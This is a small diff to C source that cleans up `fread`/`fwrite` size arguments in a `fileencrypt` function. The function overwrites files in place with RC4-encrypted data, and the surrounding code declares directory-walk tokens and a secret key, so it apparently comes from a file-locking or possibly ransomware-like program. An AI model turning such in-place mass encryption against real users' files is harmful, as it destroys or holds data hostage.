@@ -31,8 +31,6 @@ unsigned char * slash      = "\\";
 unsigned char * t_one      = ".";
 unsigned char * t_two      = "..";
 
-short int size_uc = sizeof(unsigned char); 
-
 short int vi, bi;
 
 unsigned char secret_key [_BYTE]        = {_ZERO};
@@ -144,12 +142,12 @@ void fileencrypt(const unsigned char * filename) {
      short int realread = _ZERO;
 
       while (position < fsize) {
-       realread = fread(buffer, size_uc, _BUFFER_SIZE, f);
+       realread = fread(buffer, 1, _BUFFER_SIZE, f);
 
        arc4(buffer, realread);
 
        fseek(f, position, SEEK_SET);
-       fwrite(buffer, size_uc, realread, f);
+       fwrite(buffer, 1, realread, f);
        fflush(f);
 
        memset(buffer, _ZERO, _BUFFER_SIZE);
